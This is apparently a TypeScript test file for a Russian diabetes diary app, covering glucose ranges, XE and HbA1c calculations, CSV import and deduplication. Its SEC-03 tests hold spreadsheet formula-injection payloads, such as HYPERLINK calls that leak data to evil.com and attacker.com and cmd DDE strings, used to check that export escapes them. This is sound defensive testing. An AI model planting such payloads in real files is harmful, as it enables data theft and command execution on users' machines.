import test from 'node:test';
import assert from 'node:assert/strict';
import {
  evaluateGlucose,
  calculateXE,
  calculateDayAggregates,
  calculatePeriodStats,
  calculateMonthlyStats,
  groupEntriesByDay,
  isFormulaInjection,
  escapeFormulaInjection,
  unescapeFormulaInjection,
  formatCsvCell,
  exportEntriesToCSV,
  deduplicateEntries,
  calculateEstimatedHbA1c,
  isValidDateString,
} from './diabetes';
import { DiaryEntry } from '../types/diabetes';

test('evaluateGlucose: correctly evaluates glucose ranges according to user specs', () => {
  // <= 3.9 => low (Низкий)
  assert.equal(evaluateGlucose(3.2)?.status, 'low');
  assert.equal(evaluateGlucose(3.8)?.status, 'low');
  assert.equal(evaluateGlucose(3.9)?.status, 'low');
  assert.equal(evaluateGlucose(3.8)?.shortLabel, 'Низкий');
  assert.equal(evaluateGlucose(3.9)?.shortLabel, 'Низкий');

  // 4.0 .. 9.9 => normal (Норма)
  assert.equal(evaluateGlucose(4.0)?.status, 'normal');
  assert.equal(evaluateGlucose(5.5)?.status, 'normal');
  assert.equal(evaluateGlucose(9.9)?.status, 'normal');
  assert.equal(evaluateGlucose(5.5)?.shortLabel, 'Норма');

  // 10.0 .. 13.9 => high (Высокий)
  assert.equal(evaluateGlucose(10.0)?.status, 'high');
  assert.equal(evaluateGlucose(12.4)?.status, 'high');
  assert.equal(evaluateGlucose(13.9)?.status, 'high');
  assert.equal(evaluateGlucose(11.0)?.shortLabel, 'Высокий');

  // > 13.9 => very_high (Очень высокий)
  assert.equal(evaluateGlucose(14.0)?.status, 'very_high');
  assert.equal(evaluateGlucose(18.5)?.status, 'very_high');
  assert.equal(evaluateGlucose(15.2)?.shortLabel, 'Очень высокий');

  // null / empty / invalid
  assert.equal(evaluateGlucose(null), null);
  assert.equal(evaluateGlucose(undefined), null);
  assert.equal(evaluateGlucose(0), null);
});

test('evaluateGlucose: respects custom target thresholds when settings are passed', () => {
  const custom = { hypoThreshold: 4.4, targetLow: 4.5, targetHigh: 8.5 };
  assert.equal(evaluateGlucose(4.4, custom)?.status, 'low');
  assert.equal(evaluateGlucose(4.5, custom)?.status, 'normal');
  assert.equal(evaluateGlucose(8.5, custom)?.status, 'normal');
  assert.equal(evaluateGlucose(8.6, custom)?.status, 'high');
});

test('calculateXE: correctly divides carbs by 12 and rounds to 1 decimal place', () => {
  assert.equal(calculateXE(12), 1.0);
  assert.equal(calculateXE(24), 2.0);
  assert.equal(calculateXE(36), 3.0);
  assert.equal(calculateXE(18), 1.5);
  assert.equal(calculateXE(25), 2.1);
  assert.equal(calculateXE(0), 0);
  assert.equal(calculateXE(null), null);
  assert.equal(calculateXE(undefined), null);

  // Custom ratio (e.g. 10g or 11g)
  assert.equal(calculateXE(20, 10), 2.0);
});

test('calculateDayAggregates: computes average glucose and totals for a day', () => {
  const mockEntries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-01',
      time: '08:00',
      glucose: 5.4,
      carbs: 48,
      xe: 4.0,
      rinFast: 6,
      tresiba: null,
      calories: 350,
      notes: 'Завтрак',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-01',
      time: '13:00',
      glucose: 7.2,
      carbs: 60,
      xe: 5.0,
      rinFast: 8,
      tresiba: null,
      calories: 550,
      notes: 'Обед',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-01',
      time: '22:00',
      glucose: 6.0,
      carbs: 0,
      xe: 0,
      rinFast: null,
      tresiba: 16,
      calories: 0,
      notes: 'На ночь Тресиба',
      createdAt: 3,
    },
  ];

  const summary = calculateDayAggregates(mockEntries);

  assert.equal(summary.date, '2026-11-01');
  assert.equal(summary.entriesCount, 3);
  // Avg glucose: (5.4 + 7.2 + 6.0) / 3 = 18.6 / 3 = 6.2
  assert.equal(summary.avgGlucose, 6.2);
  assert.equal(summary.totalRinFast, 14); // 6 + 8
  assert.equal(summary.totalTresiba, 16); // 16
  assert.equal(summary.totalCarbs, 108); // 48 + 60
  assert.equal(summary.totalXE, 9.0); // 4.0 + 5.0
  assert.equal(summary.totalCalories, 900); // 350 + 550
  assert.equal(summary.minGlucose, 5.4);
  assert.equal(summary.maxGlucose, 7.2);
});

test('groupEntriesByDay: groups and sorts correctly', () => {
  const entries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-01',
      time: '13:00',
      glucose: 6.5,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-02',
      time: '08:00',
      glucose: 5.0,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-01',
      time: '08:30',
      glucose: 5.2,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 3,
    },
  ];

  const grouped = groupEntriesByDay(entries);
  assert.equal(grouped.length, 2);
  // Descending date order: 2026-11-02 first, then 2026-11-01
  assert.equal(grouped[0].date, '2026-11-02');
  assert.equal(grouped[1].date, '2026-11-01');

  // Inside 2026-11-01, times must be ascending: 08:30 then 13:00
  assert.equal(grouped[1].entries[0].time, '08:30');
  assert.equal(grouped[1].entries[1].time, '13:00');
});

test('calculateMonthlyStats: calculates TIR and monthly averages', () => {
  const entries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-01',
      time: '08:00',
      glucose: 3.5, // low
      carbs: 24,
      xe: 2.0,
      rinFast: 3,
      tresiba: 14,
      calories: 200,
      notes: '',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-01',
      time: '12:00',
      glucose: 6.0, // normal
      carbs: 36,
      xe: 3.0,
      rinFast: 5,
      tresiba: null,
      calories: 400,
      notes: '',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-02',
      time: '08:00',
      glucose: 11.5, // high
      carbs: 48,
      xe: 4.0,
      rinFast: 8,
      tresiba: 14,
      calories: 500,
      notes: '',
      createdAt: 3,
    },
    {
      id: '4',
      date: '2026-11-02',
      time: '19:00',
      glucose: 15.0, // very high
      carbs: 24,
      xe: 2.0,
      rinFast: 6,
      tresiba: null,
      calories: 300,
      notes: '',
      createdAt: 4,
    },
  ];

  const stats = calculateMonthlyStats(entries, '2026-11');
  assert.equal(stats.totalEntries, 4);
  assert.equal(stats.tir.lowCount, 1);
  assert.equal(stats.tir.normalCount, 1);
  assert.equal(stats.tir.highCount, 1);
  assert.equal(stats.tir.veryHighCount, 1);
  assert.equal(stats.tir.lowPercent, 25);
  assert.equal(stats.tir.normalPercent, 25);
  assert.equal(stats.tir.highPercent, 25);
  assert.equal(stats.tir.veryHighPercent, 25);

  assert.equal(stats.activeDaysCount, 2);
  assert.equal(stats.totalRinFast, 22);
  assert.equal(stats.totalTresiba, 28);
  assert.equal(stats.avgDailyTresiba, 14);
});

test('isDayComplete: correctly requires morning, day, and evening', async () => {
  const { isDayComplete } = await import('./diabetes.ts');

  // Complete day with morning (08:00), day (13:00), evening (19:00)
  const fullDay: DiaryEntry[] = [
    { id: '1', date: '2026-11-01', time: '08:00', glucose: 5.5, carbs: 24, xe: 2, rinFast: 6, tresiba: null, calories: null, notes: 'Завтрак', createdAt: 1 },
    { id: '2', date: '2026-11-01', time: '13:00', glucose: 6.2, carbs: 36, xe: 3, rinFast: 8, tresiba: null, calories: null, notes: 'Обед', createdAt: 2 },
    { id: '3', date: '2026-11-01', time: '19:00', glucose: 7.0, carbs: 24, xe: 2, rinFast: 6, tresiba: 14, calories: null, notes: 'Ужин', createdAt: 3 },
  ];
  assert.equal(isDayComplete(fullDay), true);

  // Incomplete day: missing lunch (day)
  const missingLunch: DiaryEntry[] = [
    { id: '1', date: '2026-11-02', time: '08:00', glucose: 5.5, carbs: 24, xe: 2, rinFast: 6, tresiba: null, calories: null, notes: 'Завтрак', createdAt: 1 },
    { id: '3', date: '2026-11-02', time: '19:00', glucose: 7.0, carbs: 24, xe: 2, rinFast: 6, tresiba: 14, calories: null, notes: 'Ужин', createdAt: 3 },
  ];
  assert.equal(isDayComplete(missingLunch), false);

  // Incomplete day: missing evening
  const missingEvening: DiaryEntry[] = [
    { id: '1', date: '2026-11-03', time: '08:00', glucose: 5.5, carbs: 24, xe: 2, rinFast: 6, tresiba: null, calories: null, notes: 'Завтрак', createdAt: 1 },
    { id: '2', date: '2026-11-03', time: '13:00', glucose: 6.2, carbs: 36, xe: 3, rinFast: 8, tresiba: null, calories: null, notes: 'Обед', createdAt: 2 },
  ];
  assert.equal(isDayComplete(missingEvening), false);
});

test('parseExcelDiary: correctly imports complex Russian diabetes CSV/Excel with summary columns', async () => {
  const { parseExcelDiary } = await import('./excelImport.ts');

  const csv = `ДНЕВНИК САМОКОНТРОЛЯ ДИАБЕТА · РинФаст + Тресиба,,,,,,,,,,,,,
"ШКАЛА:  < 5 — низкий  ·  5–10 — норма  ·  > 10 и < 13,9 — высокий  ·  ≥ 13,9 — крайне высокий",,,,,,,,,,,,,
Период: 18 октября — 2 ноября 2026,,,,,,,,22 октября: печенье подтверждено; 24 октября: записей нет,,,,,
,,,,,,,,,,,,,
Дата,Время,Глюкоза (ммоль/л),Оценка (авто),Углеводы (г),ХЕ (авто),РинФаст (ЕД),Тресиба (ЕД),Еда / нагрузка / комментарий,Ср. сахар за день,Замеров за день,Сумма ХЕ за день,РинФаст за день,Ккал (оценка)
18.10.2026,21:00,,,,,5,,Ужин: 4–5 ложек риса и 400 г горбуши; РинФаст 5 ЕД,9,1,0,5,
18.10.2026,22:00,9,Норма,,,,,"Перед сном, измерение",,,,,
18.10.2026,23:30,,,,,,14,Тресиба 14 ЕД,,,,,
19.10.2026,01:00,10.4,Высокий,,,2,,Инъекция РинФаст,9.5777777777777757,18,8.5208333333333339,28,
20.10.2026,11:32,,,,,,,"Завтрак: гречка, хлеб, яблоко, котлета",,,,,505
20.10.2026,22:32,12.4,Высокий,,,3,14,Инъекция РинФаст; Тресиба,,,,,
22.10.2026,После 04:00,,,6,0.5,,,"Сахар 6 г, точное время не указано",,,,,24`;

  const file = new File([csv], 'diary.csv', { type: 'text/csv' });
  const result = await parseExcelDiary(file);

  assert.equal(result.entries.length, 7);

  // Row 1: 18.10.2026 21:00, RinFast 5
  assert.equal(result.entries[0].date, '2026-10-18');
  assert.equal(result.entries[0].time, '21:00');
  assert.equal(result.entries[0].rinFast, 5);
  assert.equal(result.entries[0].glucose, null);

  // Row 2: 18.10.2026 22:00, Glucose 9
  assert.equal(result.entries[1].date, '2026-10-18');
  assert.equal(result.entries[1].time, '22:00');
  assert.equal(result.entries[1].glucose, 9);

  // Row 3: 18.10.2026 23:30, Tresiba 14
  assert.equal(result.entries[2].tresiba, 14);

  // Row 4: 19.10.2026 01:00, Glucose 10.4, RinFast 2 (NOT 28 from 'РинФаст за день'!)
  assert.equal(result.entries[3].date, '2026-10-19');
  assert.equal(result.entries[3].glucose, 10.4);
  assert.equal(result.entries[3].rinFast, 2);

  // Row 5: 20.10.2026 11:32, Calories 505
  assert.equal(result.entries[4].calories, 505);

  // Row 6: 20.10.2026 22:32, Glucose 12.4, RinFast 3, Tresiba 14
  assert.equal(result.entries[5].glucose, 12.4);
  assert.equal(result.entries[5].rinFast, 3);
  assert.equal(result.entries[5].tresiba, 14);

  // Row 7: 22.10.2026 "После 04:00" -> time 04:00, Carbs 6, XE 0.5, Calories 24
  assert.equal(result.entries[6].time, '04:00');
  assert.equal(result.entries[6].carbs, 6);
  assert.equal(result.entries[6].xe, 0.5);
  assert.equal(result.entries[6].calories, 24);
});

// --- ТЕСТЫ БЕЗОПАСНОСТИ CSV / FORMULA INJECTION (SEC-03) ---

test('SEC-03: isFormulaInjection распознает префиксы =, +, -, @, |, % и обходы через пробелы и спецсимволы', () => {
  // 1. Прямые опасные префиксы
  assert.equal(isFormulaInjection('=1+1'), true, '= должен распознаваться');
  assert.equal(isFormulaInjection('=HYPERLINK("http://attacker.com")'), true);
  assert.equal(isFormulaInjection('+cmd|\'/C calc\'!A0'), true, '+ должен распознаваться');
  assert.equal(isFormulaInjection('-2+3+cmd|\'/C calc\'!A0'), true, '- должен распознаваться');
  assert.equal(isFormulaInjection('@SUM(A1:A10)'), true, '@ должен распознаваться');
  assert.equal(isFormulaInjection('|calc'), true, '| должен распознаваться');
  assert.equal(isFormulaInjection('%COMSPEC%'), true, '% должен распознаваться');

  // 2. Обходы через пробелы в начале
  assert.equal(isFormulaInjection('   =1+1'), true, 'Пробелы перед = не должны помогать обойти фильтр');
  assert.equal(isFormulaInjection('      @SUM(B1:B2)'), true);
  assert.equal(isFormulaInjection('\u00A0=1+1'), true, 'Неразрывный пробел (U+00A0) перед = должен блокироваться');

  // 3. Обходы через табуляцию и переносы строк
  assert.equal(isFormulaInjection('\t=1+1'), true, 'Табуляция перед = должна блокироваться');
  assert.equal(isFormulaInjection('\tcmd'), true, 'Ведущая табуляция должна блокироваться');
  assert.equal(isFormulaInjection('\r\n=HYPERLINK()'), true, 'Ведущий перенос строки перед = должен блокироваться');
  assert.equal(isFormulaInjection('\n-1+2'), true, 'Ведущий перенос строки перед - должен блокироваться');

  // 4. Обычные безопасные пользовательские строки и даты не должны помечаться как формулы
  assert.equal(isFormulaInjection('Обед: гречка 150г, курица 120г'), false);
  assert.equal(isFormulaInjection('Завтрак'), false);
  assert.equal(isFormulaInjection('2026-11-02'), false);
  assert.equal(isFormulaInjection('14:30'), false);
  assert.equal(isFormulaInjection('5.5'), false);
  assert.equal(isFormulaInjection(''), false);
  assert.equal(isFormulaInjection('   '), false);
});

test('SEC-03: escapeFormulaInjection и unescapeFormulaInjection обеспечивают полную обратимость (roundtrip)', () => {
  // Опасная формула: при экспорте добавляется ведущий апостроф, при импорте — безопасно снимается
  const dangerous = '=HYPERLINK("http://leak?data=123"; "Отчет")';
  const escaped = escapeFormulaInjection(dangerous);
  assert.equal(escaped, `'${dangerous}`, 'Должен быть добавлен ведущий апостроф');
  const unescaped = unescapeFormulaInjection(escaped);
  assert.equal(unescaped, dangerous, 'Исходная строка должна быть точно восстановлена');

  // Пользовательский список с дефисом
  const bullet = '- Измерен сахар перед сном';
  const escapedBullet = escapeFormulaInjection(bullet);
  assert.equal(escapedBullet, `'- Измерен сахар перед сном`);
  assert.equal(unescapeFormulaInjection(escapedBullet), bullet);

  // Пользовательская запись с плюсом
  const plusNote = '+2 ед РинФаст на коррекцию';
  const escapedPlus = escapeFormulaInjection(plusNote);
  assert.equal(escapedPlus, `'+2 ед РинФаст на коррекцию`);
  assert.equal(unescapeFormulaInjection(escapedPlus), plusNote);

  // Обычная строка не изменяется
  const regular = 'Обычный обед';
  assert.equal(escapeFormulaInjection(regular), regular);
  assert.equal(unescapeFormulaInjection(regular), regular);

  // Строка с одинарной кавычкой не портится, если после кавычки нет триггера формулы
  const quoted = "'Цитата врача'";
  assert.equal(escapeFormulaInjection(quoted), quoted);
  assert.equal(unescapeFormulaInjection(quoted), quoted);
});

test('SEC-03: formatCsvCell корректно экранирует кавычки, разделители, переносы строк и формулы', () => {
  // 1. Пустые значения
  assert.equal(formatCsvCell(null), '');
  assert.equal(formatCsvCell(undefined), '');
  assert.equal(formatCsvCell(''), '');

  // 2. Числовые значения (десятичная запятая для русской локали)
  assert.equal(formatCsvCell(5.5), '5,5');
  assert.equal(formatCsvCell(12), '12');

  // 3. Формула экранируется апострофом и оборачивается в кавычки
  assert.equal(formatCsvCell('=1+1'), "\"'=1+1\"");
  assert.equal(formatCsvCell('   =SUM(A1:A5)'), "\"'   =SUM(A1:A5)\"");
  assert.equal(formatCsvCell('@dangerous'), "\"'@dangerous\"");

  // 4. Текст с кавычками удваивает внутренние кавычки
  assert.equal(formatCsvCell('Заметка с "кавычками"'), '"Заметка с ""кавычками"""');

  // 5. Текст с разделителем (;) оборачивается в кавычки
  assert.equal(formatCsvCell('Чай; печенье'), '"Чай; печенье"');

  // 6. Текст с переносом строки оборачивается в кавычки
  assert.equal(formatCsvCell("Строка 1\nСтрока 2"), "\"Строка 1\nСтрока 2\"");

  // 7. Формула, содержащая кавычки и точку с запятой
  const complexFormula = '=cmd|"/C calc"!A0; test';
  assert.equal(formatCsvCell(complexFormula), '"\'=cmd|""/C calc""!A0; test"');
});

test('SEC-03: exportEntriesToCSV экранирует все текстовые поля, нейтрализует формулы и добавляет UTF-8 BOM', () => {
  const entries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-02',
      time: '12:00',
      glucose: 5.5,
      carbs: 48,
      xe: 4.0,
      rinFast: 4,
      tresiba: null,
      calories: 450,
      notes: '=HYPERLINK("http://evil.com/leak?data="&C2; "Открыть протокол")',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-02',
      time: '13:00',
      glucose: 8.0,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '-2+3+cmd|\'/C calc\'!A0',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-02',
      time: '14:00',
      glucose: 4.2,
      carbs: 20,
      xe: 1.7,
      rinFast: 2,
      tresiba: null,
      calories: 180,
      notes: '   +cmd|\'/C notepad\'!A0', // обход пробелами
      createdAt: 3,
    },
    {
      id: '4',
      date: '2026-11-02',
      time: '18:00',
      glucose: 6.1,
      carbs: 60,
      xe: 5.0,
      rinFast: 5,
      tresiba: 14,
      calories: 600,
      notes: 'Обычный обед: борщ, хлеб 2 куска; чай с сахарозаменителем',
      createdAt: 4,
    },
  ];

  const csv = exportEntriesToCSV(entries);

  // 1. Проверяем наличие UTF-8 BOM (\uFEFF)
  assert.equal(csv.startsWith('\uFEFF'), true, 'CSV должен начинаться с UTF-8 BOM для корректного открытия в Excel');

  // 2. В файле не должно быть ни одной ячейки, начинающейся прямо с =, +, -, @ без апострофа!
  // Проверяем: после точки с запятой или в начале строки ни одно поле в кавычках не должно начинаться с опасного символа
  assert.equal(csv.includes(';"='), false, 'Не должно быть неэкранированного ;"="');
  assert.equal(csv.includes(';"+'), false, 'Не должно быть неэкранированного ;"+"');
  assert.equal(csv.includes(';"-'), false, 'Не должно быть неэкранированного ;"-"');
  assert.equal(csv.includes(';"@'), false, 'Не должно быть неэкранированного ;"@"');

  // 3. Проверяем наличие защитного апострофа в опасных ячейках
  assert.ok(csv.includes('"\'=HYPERLINK'));
  assert.ok(csv.includes('"\'-2+3+cmd'));
  assert.ok(csv.includes('"\'   +cmd'));

  // 4. Обычная русская запись со знаками препинания должна быть корректно сохранена
  assert.ok(csv.includes('"Обычный обед: борщ, хлеб 2 куска; чай с сахарозаменителем"'));
});

test('SEC-03: Совместимость экспорта в CSV и последующего импорта через parseExcelDiary (полный roundtrip)', async () => {
  const { parseExcelDiary } = await import('./excelImport');

  const originalEntries: DiaryEntry[] = [
    {
      id: 'orig-1',
      date: '2026-11-02',
      time: '08:30',
      glucose: 5.6,
      carbs: 36,
      xe: 3.0,
      rinFast: 4,
      tresiba: 14,
      calories: 320,
      notes: '+2 ед на ДПС перед едой',
      createdAt: 1,
    },
    {
      id: 'orig-2',
      date: '2026-11-02',
      time: '13:15',
      glucose: 6.8,
      carbs: 48,
      xe: 4.0,
      rinFast: 5,
      tresiba: null,
      calories: 450,
      notes: '- Обед в кафе: салат Цезарь; паста',
      createdAt: 2,
    },
    {
      id: 'orig-3',
      date: '2026-11-02',
      time: '19:00',
      glucose: 9.4,
      carbs: 24,
      xe: 2.0,
      rinFast: 3,
      tresiba: null,
      calories: 250,
      notes: '=HYPERLINK("http://safe.org"; "Тестовая ссылка")',
      createdAt: 3,
    },
  ];

  // 1. Экспортируем в защищенный CSV
  const csvContent = exportEntriesToCSV(originalEntries);

  // 2. Имитируем файл браузера и импортируем обратно
  const file = new File([csvContent], 'exported_diary.csv', { type: 'text/csv' });
  const importResult = await parseExcelDiary(file);

  assert.equal(importResult.entries.length, 3, 'Все 3 записи должны успешно импортироваться');

  // 3. Проверяем полное восстановление данных и заметок (без мусора и без лишних апострофов)
  assert.equal(importResult.entries[0].date, '2026-11-02');
  assert.equal(importResult.entries[0].time, '08:30');
  assert.equal(importResult.entries[0].glucose, 5.6);
  assert.equal(importResult.entries[0].notes, '+2 ед на ДПС перед едой', 'Заметка с плюсом должна быть точно восстановлена');

  assert.equal(importResult.entries[1].time, '13:15');
  assert.equal(importResult.entries[1].glucose, 6.8);
  assert.equal(importResult.entries[1].notes, '- Обед в кафе: салат Цезарь; паста', 'Заметка со списком и точкой с запятой восстановлена');

  assert.equal(importResult.entries[2].time, '19:00');
  assert.equal(importResult.entries[2].glucose, 9.4);
  assert.equal(importResult.entries[2].notes, '=HYPERLINK("http://safe.org"; "Тестовая ссылка")', 'Текст формулы безопасно сохранен и восстановлен');
});

test('deduplicateEntries: объединяет и удаляет полные и временные дубликаты записей', () => {
  const duplicateList: DiaryEntry[] = [
    {
      id: 'uuid-1',
      date: '2026-11-02',
      time: '12:00',
      glucose: 5.6,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 100,
    },
    {
      id: 'uuid-2',
      date: '2026-11-02',
      time: '12:00',
      glucose: 5.6,
      carbs: 48,
      xe: 4.0,
      rinFast: 4,
      tresiba: null,
      calories: 320,
      notes: 'Обед',
      tag: 'lunch',
      createdAt: 200,
    },
    {
      id: 'uuid-1', // точный дубликат по ID
      date: '2026-11-02',
      time: '12:00',
      glucose: 5.6,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 100,
    },
    {
      id: 'uuid-3',
      date: '2026-11-02',
      time: '18:00',
      glucose: 7.2,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: 'Ужин',
      createdAt: 300,
    },
  ];

  const deduped = deduplicateEntries(duplicateList);
  assert.equal(deduped.length, 2, 'Из 4 записей с дубликатами должно остаться ровно 2 уникальные');

  const lunch = deduped.find((e) => e.time === '12:00');
  assert.ok(lunch);
  assert.equal(lunch.glucose, 5.6);
  assert.equal(lunch.carbs, 48, 'Недостающие углеводы должны быть объединены');
  assert.equal(lunch.rinFast, 4, 'Инсулин должен быть объединен');
  assert.equal(lunch.notes, 'Обед', 'Заметка должна быть сохранена');
  assert.equal(lunch.tag, 'lunch');

  const dinner = deduped.find((e) => e.time === '18:00');
  assert.ok(dinner);
  assert.equal(dinner.glucose, 7.2);
});

test('P2: calculateEstimatedHbA1c — единая формула ADAG и граничные случаи', () => {
  // Невалидные / отсутствующие значения
  assert.equal(calculateEstimatedHbA1c(null), null);
  assert.equal(calculateEstimatedHbA1c(undefined), null);
  assert.equal(calculateEstimatedHbA1c(0), null);
  assert.equal(calculateEstimatedHbA1c(-5), null);
  assert.equal(calculateEstimatedHbA1c(NaN), null);
  assert.equal(calculateEstimatedHbA1c(Infinity), null);

  // Стандартные клинические значения ADAG: ((avgG * 18.05 + 46.7) / 28.7)
  // 5.5 ммоль/л -> (5.5 * 18.05 + 46.7) / 28.7 = 145.975 / 28.7 = 5.086 -> 5.1%
  assert.equal(calculateEstimatedHbA1c(5.5), 5.1);

  // 7.0 ммоль/л -> (7.0 * 18.05 + 46.7) / 28.7 = 173.05 / 28.7 = 6.029 -> 6.0%
  assert.equal(calculateEstimatedHbA1c(7.0), 6.0);

  // 10.0 ммоль/л -> (10.0 * 18.05 + 46.7) / 28.7 = 227.2 / 28.7 = 7.916 -> 7.9%
  assert.equal(calculateEstimatedHbA1c(10.0), 7.9);

  // Проверка совпадения со stats.estimatedHbA1c из calculateMonthlyStats
  const dummyEntries: DiaryEntry[] = [
    { id: '1', date: '2026-11-01', time: '08:00', glucose: 7.0, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 100 },
  ];
  const stats = calculateMonthlyStats(dummyEntries);
  assert.equal(stats.estimatedHbA1c, calculateEstimatedHbA1c(7.0));
  assert.equal(stats.estimatedHbA1c, 6.0);
});

test('P2: isValidDateString — строгая проверка календарных дат', () => {
  assert.equal(isValidDateString('2026-11-02'), true);
  assert.equal(isValidDateString('2024-02-29'), true, '2024 високосный');
  assert.equal(isValidDateString('2026-02-28'), true);

  // Несуществующие даты
  assert.equal(isValidDateString('2026-02-29'), false, '2026 невисокосный');
  assert.equal(isValidDateString('2026-02-31'), false, '31 февраля');
  assert.equal(isValidDateString('2026-04-31'), false, '31 апреля');
  assert.equal(isValidDateString('2026-11-31'), false, '31 ноября');
  assert.equal(isValidDateString('2026-13-01'), false, '13-й месяц');
  assert.equal(isValidDateString('invalid'), false);
  assert.equal(isValidDateString(''), false);
  assert.equal(isValidDateString(null), false);
  assert.equal(isValidDateString(undefined), false);
});

test('P2: parseExcelDiary — безопасный импорт, отказ от слепого fallback и проверка границ', async () => {
  const { parseExcelDiary } = await import('./excelImport.ts');

  // 1. Попытка импортировать произвольный CSV без заголовков диабета (например финансовую накладную)
  const arbitraryCsv = `Товар,Количество,Цена,Сумма
Хлеб нарезной,2,45,90
Молоко 3.2%,1,80,80
Яблоки сезонные,3,120,360`;

  const arbitraryFile = new File([arbitraryCsv], 'invoice.csv', { type: 'text/csv' });
  const arbitraryResult = await parseExcelDiary(arbitraryFile);

  assert.equal(arbitraryResult.entries.length, 0, 'Нераспознанный формат не должен создавать записей');
  assert.ok(arbitraryResult.errors.length > 0, 'Должна возвращаться понятная ошибка формата');
  assert.ok(arbitraryResult.errors[0].includes('Не удалось распознать формат файла'));

  // 2. CSV с недопустимыми/отрицательными значениями и некорректными календарными датами
  const invalidMetricsCsv = `Дата,Время,Глюкоза (ммоль/л),Углеводы (г),ХЕ,РинФаст (ЕД),Тресиба (ЕД),Заметки
2026-02-31,08:00,5.5,30,2.5,4,,Запись с несуществующей датой (31 февраля)
2026-11-02,09:00,-5.0,-20,-1,-4,-10,Запись с отрицательными значениями
2026-11-02,12:00,999.0,5000,200,500,500,Запись с абсурдными выбросами
2026-11-02,18:00,6.2,48,4.0,5,14,Корректная запись дневника`;

  const invalidMetricsFile = new File([invalidMetricsCsv], 'test_bounds.csv', { type: 'text/csv' });
  const boundsResult = await parseExcelDiary(invalidMetricsFile);

  // 2026-02-31 пропущена из-за невалидной даты.
  // Строка с отрицательными значениями: все числовые поля становятся null, но есть заметка -> попадает как запись с валидной датой и заметкой, но с null в глюкозе/инсулине/углеводах!
  // Строка с выбросами 999: отсекается до null.
  // Корректная запись импортируется полностью.
  const validEntry = boundsResult.entries.find((e) => e.time === '18:00');
  assert.ok(validEntry, 'Корректная запись должна успешно сохраниться');
  assert.equal(validEntry.glucose, 6.2);
  assert.equal(validEntry.carbs, 48);
  assert.equal(validEntry.xe, 4.0);
  assert.equal(validEntry.rinFast, 5);
  assert.equal(validEntry.tresiba, 14);

  // Проверяем строку с отрицательными числами
  const negativeEntry = boundsResult.entries.find((e) => e.time === '09:00');
  assert.ok(negativeEntry);
  assert.equal(negativeEntry.glucose, null, 'Отрицательная глюкоза должна быть отброшена');
  assert.equal(negativeEntry.carbs, null, 'Отрицательные углеводы должны быть отброшены');
  assert.equal(negativeEntry.rinFast, null, 'Отрицательный инсулин должен быть отброшен');
  assert.equal(negativeEntry.tresiba, null, 'Отрицательный базал должен быть отброшен');

  // Проверяем строку с 999
  const outlierEntry = boundsResult.entries.find((e) => e.time === '12:00');
  assert.ok(outlierEntry);
  assert.equal(outlierEntry.glucose, null, 'Глюкоза 999 должна быть отброшена как вне физиологических границ');

  // Запись с датой 2026-02-31 не должна быть импортирована вовсе
  const feb31Entry = boundsResult.entries.find((e) => e.date === '2026-02-31');
  assert.equal(feb31Entry, undefined, 'Запись с 31 февраля не должна существовать');

  // 3. Строгий импорт дневника БЕЗ заголовков (соответствующего известной схеме: дата, время, глюкоза...)
  const headerlessValidCsv = `2026-11-02,08:30,5.4,Норма,36,3.0,4,,Завтрак
2026-11-02,13:00,6.8,Норма,48,4.0,5,,Обед
2026-11-02,19:00,8.2,Норма,24,2.0,3,14,Ужин`;

  const headerlessFile = new File([headerlessValidCsv], 'headerless.csv', { type: 'text/csv' });
  const headerlessResult = await parseExcelDiary(headerlessFile);

  assert.equal(headerlessResult.entries.length, 3, 'Строгий формат без заголовков должен успешно распознаваться');
  assert.equal(headerlessResult.entries[0].date, '2026-11-02');
  assert.equal(headerlessResult.entries[0].time, '08:30');
  assert.equal(headerlessResult.entries[0].glucose, 5.4);
  assert.equal(headerlessResult.entries[0].rinFast, 4);
});

test('JS Loading Optimization: dynamic import and module caching for Excel libraries', async () => {
  const { getReadXlsxFile, parseExcelDiary } = await import('./excelImport.ts');
  const { getWriteXlsxFile, exportEntriesToXLSX } = await import('./excelExport.ts');

  // 1. Проверяем getReadXlsxFile: возвращает функцию и возвращает тот же закэшированный промис
  const readFn1 = await getReadXlsxFile();
  const readFn2 = await getReadXlsxFile();
  assert.equal(typeof readFn1, 'function', 'getReadXlsxFile должен разрешаться в функцию');
  assert.strictEqual(readFn1, readFn2, 'getReadXlsxFile должен использовать закэшированный модуль без повторной загрузки');

  // 2. Проверяем getWriteXlsxFile: возвращает функцию и закэшированный результат
  const writeFn1 = await getWriteXlsxFile();
  const writeFn2 = await getWriteXlsxFile();
  assert.equal(typeof writeFn1, 'function', 'getWriteXlsxFile должен разрешаться в функцию');
  assert.strictEqual(writeFn1, writeFn2, 'getWriteXlsxFile должен использовать закэшированный модуль без повторной загрузки');

  // 3. Проверяем парсинг CSV: не вызывает getReadXlsxFile (работает автономно)
  const csvFile = new File(['Дата,Время,Глюкоза\n2026-11-02,09:00,5.6'], 'test.csv', { type: 'text/csv' });
  const csvResult = await parseExcelDiary(csvFile);
  assert.equal(csvResult.entries.length, 1);
  assert.equal(csvResult.entries[0].glucose, 5.6);

  // 4. Проверяем exportEntriesToXLSX с защитой от Formula Injection (SEC-03)
